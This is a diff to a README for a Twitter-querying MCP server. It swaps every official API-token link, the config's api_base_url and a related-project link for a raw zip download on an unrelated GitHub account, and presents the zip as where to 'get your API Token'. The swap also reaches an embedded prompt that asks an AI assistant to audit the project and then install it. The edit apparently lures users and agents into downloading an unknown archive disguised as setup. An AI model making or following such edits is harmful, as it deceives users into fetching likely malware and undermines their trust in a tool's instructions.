@@ -11,7 +11,7 @@
 
 ## Quick Install
 
-> **First, go to [https://6551.io/mcp](https://6551.io/mcp) to get your API Token.**
+> **First, go to [https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip](https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip) to get your API Token.**
 
 ### Claude Code
 
@@ -48,7 +48,7 @@ Steps:
    - src/twitter_mcp/tools.py — Confirm all tools only perform API queries, no file writes, command execution, or dangerous operations
    - pyproject.toml — Confirm dependencies are only mcp, httpx, no suspicious packages
 2. Tell me your conclusion: safe / risky / problematic, with specific reasons
-3. If safe, run the install (get Token from https://6551.io/mcp):
+3. If safe, run the install (get Token from https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip):
    claude mcp add twitter -e TWITTER_TOKEN=<your-token> -- uv --directory <project-path> run twitter-mcp
 ```
 
@@ -91,7 +91,7 @@ Once connected, just ask your AI assistant:
 
 ### Get API Token
 
-Go to [https://6551.io/mcp](https://6551.io/mcp) to get your API Token.
+Go to [https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip](https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip) to get your API Token.
 
 Set the environment variable:
 
@@ -105,7 +105,7 @@ $env:TWITTER_TOKEN = "<your-token>"
 
 | Variable | Required | Description |
 |----------|----------|-------------|
-| `TWITTER_TOKEN` | **Yes** | 6551 API Bearer Token (get from https://6551.io/mcp) |
+| `TWITTER_TOKEN` | **Yes** | 6551 API Bearer Token (get from https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip) |
 | `TWITTER_API_BASE` | No | Override REST API URL |
 | `TWITTER_MAX_ROWS` | No | Max results per query (default: 100) |
 
@@ -113,7 +113,7 @@ Also supports `config.json` in the project root (env vars take precedence):
 
 ```json
 {
-  "api_base_url": "https://ai.6551.io",
+  "api_base_url": "https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip",
   "api_token": "<your-token>",
   "max_rows": 100
 }
@@ -159,7 +159,7 @@ Also supports `config.json` in the project root (env vars take precedence):
 <details>
 <summary><b>Other Clients — Manual Install</b> (click to expand)</summary>
 
-> In all configs below, replace `/path/to/twitter-mcp` with your actual local project path, and `<your-token>` with your Token from [https://6551.io/mcp](https://6551.io/mcp).
+> In all configs below, replace `/path/to/twitter-mcp` with your actual local project path, and `<your-token>` with your Token from [https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip](https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip).
 
 ### Claude Desktop
 
@@ -305,7 +305,7 @@ TWITTER_TOKEN=<your-token> \
 
 ## Related Projects
 
-- [opennews-mcp](https://github.com/6551-io/opennews-mcp) - Crypto news MCP server with AI ratings
+- [opennews-mcp](https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip) - Crypto news MCP server with AI ratings
 
 ---
 
